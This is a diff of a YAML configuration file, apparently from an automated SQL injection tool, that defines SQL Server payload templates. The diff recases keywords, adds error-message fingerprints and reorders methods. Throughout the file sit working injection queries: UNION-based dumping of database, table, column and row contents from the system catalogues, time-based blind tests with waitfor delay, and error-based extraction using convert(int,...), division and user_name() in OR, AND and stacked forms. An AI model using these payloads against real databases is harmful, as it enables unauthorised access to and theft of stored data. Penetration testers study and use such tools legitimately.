@@ -2,40 +2,40 @@ vendor: SQL Server
 
 resource:
  info: |
-  SELECT
+  select
       %20@@version
-      %2B'${enclose_value_sql}'
-      %2BDB_NAME()
-      %2B'${enclose_value_sql}'
-      %2Buser
-      %2B'${trail_sql}'
+      %2b'${enclose_value_sql}'
+      %2bdb_name()
+      %2b'${enclose_value_sql}'
+      %2buser
+      %2b'${trail_sql}'
 
  schema:
   database: |
-   SELECT
+   select
        replace(
-           CONVERT(
-               VARCHAR(MAX),
-               CONVERT(
-                   VARBINARY(MAX),
-                   '0'%2bSTUFF(
+           convert(
+               varchar(max),
+               convert(
+                   varbinary(max),
+                   '0'%2bstuff(
                        (
-                           SELECT replace(sys.fn_varbintohexstr(CAST(
+                           select replace(sys.fn_varbintohexstr(cast(
                                ','
                                %2b'${enclose_value_sql}'
-                               %2BCAST(name AS VARCHAR(MAX))
-                               %2B'${separator_qte_sql}0${enclose_value_sql}'
-                               AS VARBINARY(MAX)
+                               %2bcast(name as varchar(max))
+                               %2b'${separator_qte_sql}0${enclose_value_sql}'
+                               as varbinary(max)
                            )),'0x','')
-                           FROM (
+                           from (
                                select
                                    name,
-                                   ROW_NUMBER() OVER (ORDER BY(SELECT 1)) AS rnum
+                                   row_number() over (order by(select 1)) as rnum
                                from master..sysdatabases
                            )x
                            where 1=1
                            ${limit}
-                           FOR XML PATH('')
+                           for xml path('')
                        ),
                        1,
                        1,
@@ -44,37 +44,37 @@ resource:
                    2
                )
            )
-           %2B '${trail_sql}',
+           %2b '${trail_sql}',
            ',',
            '${separator_cell_sql}'
        )
 
   table: |
-   SELECT
+   select
        replace(
-           CONVERT(
-               VARCHAR(MAX),
-               CONVERT(
-                   VARBINARY(MAX),
-                   '0'%2bSTUFF(
+           convert(
+               varchar(max),
+               convert(
+                   varbinary(max),
+                   '0'%2bstuff(
                        (
-                           SELECT replace(sys.fn_varbintohexstr(CAST(
+                           select replace(sys.fn_varbintohexstr(cast(
                                ','
                                %2b'${enclose_value_sql}'
-                               %2BCAST(name AS VARCHAR(MAX))
-                               %2B'${separator_qte_sql}0${enclose_value_sql}'
-                               AS VARBINARY(MAX)
+                               %2bcast(name as varchar(max))
+                               %2b'${separator_qte_sql}0${enclose_value_sql}'
+                               as varbinary(max)
                            )),'0x','')
-                           FROM (
+                           from (
                                select
                                    name,
-                                   ROW_NUMBER() OVER (ORDER BY(SELECT 1)) AS rnum
+                                   row_number() over (order by(select 1)) as rnum
                                from ${database}..sysobjects
-                               WHERE xtype='U'
+                               where xtype='U'
                            )x
                            where 1=1
                            ${limit}
-                           FOR XML PATH('')
+                           for xml path('')
                        ),
                        1,
                        1,
@@ -83,40 +83,40 @@ resource:
                    2
                )
            )
-           %2B '${trail_sql}',
+           %2b '${trail_sql}',
            ',',
            '${separator_cell_sql}'
        )
 
   column: |
-   SELECT
+   select
        replace(
-           CONVERT(
-               VARCHAR(MAX),
-               CONVERT(
-                   VARBINARY(MAX),
-                   '0'%2bSTUFF(
+           convert(
+               varchar(max),
+               convert(
+                   varbinary(max),
+                   '0'%2bstuff(
                        (
-                           SELECT replace(sys.fn_varbintohexstr(CAST(
+                           select replace(sys.fn_varbintohexstr(cast(
                                ','
                                %2b'${enclose_value_sql}'
-                               %2BCAST(name AS VARCHAR(MAX))
-                               %2B'${separator_qte_sql}0${enclose_value_sql}'
-                               AS VARBINARY(MAX)
+                               %2bcast(name as varchar(max))
+                               %2b'${separator_qte_sql}0${enclose_value_sql}'
+                               as varbinary(max)
                            )),'0x','')
-                           FROM (
+                           from (
                                select
                                    c.name,
-                                   ROW_NUMBER() OVER (ORDER BY(SELECT 1)) AS rnum
-                               FROM
+                                   row_number() over (order by(select 1)) as rnum
+                               from
                                    ${database}..syscolumns c,
                                    ${database}..sysobjects t
-                               WHERE c.id=t.id
-                               AND t.name='${table}'
+                               where c.id=t.id
+                               and t.name='${table}'
                            )x
                            where 1=1
                            ${limit}
-                           FOR XML PATH('')
+                           for xml path('')
                        ),
                        1,
                        1,
@@ -125,38 +125,38 @@ resource:
                    2
                )
            )
-           %2B '${trail_sql}',
+           %2b '${trail_sql}',
            ',',
            '${separator_cell_sql}'
        )
 
   row:
    query: |
-    SELECT
+    select
         replace(
-            CONVERT(
-                VARCHAR(MAX),
-                CONVERT(
-                    VARBINARY(MAX),
-                    '0'%2bSTUFF(
+            convert(
+                varchar(max),
+                convert(
+                    varbinary(max),
+                    '0'%2bstuff(
                         (
-                            SELECT
-                                replace(sys.fn_varbintohexstr(CAST(
+                            select
+                                replace(sys.fn_varbintohexstr(cast(
                                     ','
                                     %2b'${enclose_value_sql}'
-                                    %2BCAST(${fields} AS VARCHAR(MAX))
-                                    %2B'${separator_qte_sql}0${enclose_value_sql}'
-                                    AS VARBINARY(MAX)
+                                    %2bcast(${fields} as varchar(max))
+                                    %2b'${separator_qte_sql}0${enclose_value_sql}'
+                                    as varbinary(max)
                                 )),'0x','')
-                            FROM (
+                            from (
                                 select
                                     *,
-                                    ROW_NUMBER() OVER (ORDER BY(SELECT 1)) AS rnum
-                                FROM ${database}.dbo.${table}
+                                    row_number() over (order by(select 1)) as rnum
+                                from ${database}.dbo.${table}
                             )x
                             where 1=1
                             ${limit}
-                            FOR XML PATH('')
+                            for xml path('')
                         ),
                         1,
                         1,
@@ -165,14 +165,14 @@ resource:
                     2
                 )
             )
-            %2B '${trail_sql}',
+            %2b '${trail_sql}',
             ',',
             '${separator_cell_sql}'
         )
    fields:
     field: |
-     LTRIM(
-         RTRIM(
+     ltrim(
+         rtrim(
              coalesce(
                  ${field.value},
                  ''
@@ -187,21 +187,29 @@ strategy:
    (
        select
            '${lead}'
-           %2Bsubstring(
+           %2bsubstring(
                (${injection}),
                ${window.char},
                65536
            )
    )
-  limit: and rnum BETWEEN ${limit.value} AND 65536
-  failsafe: CONVERT(varchar, (1337${indice}7330%2b1))
+  limit: and rnum BETWEEN ${limit.value} and 65536
+  failsafe: convert(varchar, (1337${indice}7330%2b1))
   calibrator: replicate(${calibrator_hex}, 1024)
   limitBoundary: 1
   endingComment: --+-
   fingerprint:
    errorMessage:
+    # Spring
+    - No column name was specified for column .* of '.*'. [SQL State=.*, DB Errorcode=.*]
+    - Incorrect syntax near '.*'. [SQL State=.*, DB Errorcode=.*]
+    - An object or column name is missing or empty. For SELECT INTO statements, verify each column has a name. For other statements, look for empty alias names. Aliases defined as "" or [] are not allowed. Change the alias to a valid name. [SQL State=.*, DB Errorcode=.*]
+    - Unclosed quotation mark after the character string '.*'. [SQL State=.*, DB Errorcode=.*]
+    
     - "[Microsoft][SQL Server"
     - SQL Server
+   orderByErrorMessage:
+    - The ORDER BY position number 1337 is out of range of the number of items in the select list
 
  normal:
   indices: union select ${indices}
@@ -243,81 +251,75 @@ strategy:
   # TODO no boolean mode here on Time for sqlserver
   time: |
    ; if (${test})
-       WAITFOR DELAY '00:00:00'
+       waitfor delay '00:00:00'
    else
-       WAITFOR DELAY '00:00:${sleep_time}'
+       waitfor delay '00:00:${sleep_time}'
   
  error:
   method:
   
-   - name: CONVERT::EXPL:Stack
+   - name: Cast:or explicit
      query: |
-      ;select CONVERT(INT,(
+      /* Conversion failed when converting the nvarchar value '<sqli>' to data type int. */
+      or 1=convert(int,(
           ${window}
       ))
-     # TODO Add to SQLEngine
-     capacity: 1991 
-  
-   - name: CONVERT::EXPL:OR
-     query: |
-      OR 1=CONVERT(INT,(
-          ${window}
-      ))
-     # TODO Add to SQLEngine
      capacity: 1991 
            
-   - name: CONVERT::EXPL:OR
+   - name: Cast:and explicit
      query: |
-      AND 1=CONVERT(INT,(
+      and 1=convert(int,(
           ${window}
       ))
-     # TODO Add to SQLEngine
      capacity: 1991       
   
-   - name: CONVERT::IMPL:Stack
+   - name: Cast:stack explicit
+     query: |
+      ;select convert(int,(
+          ${window}
+      ))
+     capacity: 1991 
+  
+   - name: Cast:or implicit
+     query: |
+      /* Conversion failed when converting the nvarchar value '<sqli>' to data type int. */
+      or 1=1/(
+          ${window}
+      )
+     capacity: 1991 
+           
+   - name: Cast:and implicit
+     query: |
+      and 1=1/(
+          ${window}
+      )
+     capacity: 1991       
+  
+   - name: Cast:stack implicit
      query: |
       ;select 1/(
           ${window}
       )
-     # TODO Add to SQLEngine
      capacity: 1991 
   
-   - name: CONVERT::IMPL:OR
+   - name: User_name:or
      query: |
-      OR 1=1/(
+      /* Conversion failed when converting the nvarchar value '<sqli>' to data type int. */
+      or 1=user_name((
           ${window}
-      )
-     # TODO Add to SQLEngine
+      ))
      capacity: 1991 
            
-   - name: CONVERT::IMPL:OR
+   - name: User_name:and
      query: |
-      AND 1=1/(
+      and 1=user_name((
           ${window}
-      )
-     # TODO Add to SQLEngine
+      ))
      capacity: 1991       
   
-   - name: USER_NAME:OR
+   - name: User_name:stack
      query: |
       ;select user_name((
           ${window}
       ))
-     # TODO Add to SQLEngine
      capacity: 1991 
-  
-   - name: USER_NAME:OR
-     query: |
-      OR 1=user_name((
-          ${window}
-      ))
-     # TODO Add to SQLEngine
-     capacity: 1991 
-           
-   - name: USER_NAME:OR
-     query: |
-      AND 1=user_name((
-          ${window}
-      ))
-     # TODO Add to SQLEngine
-     capacity: 1991       
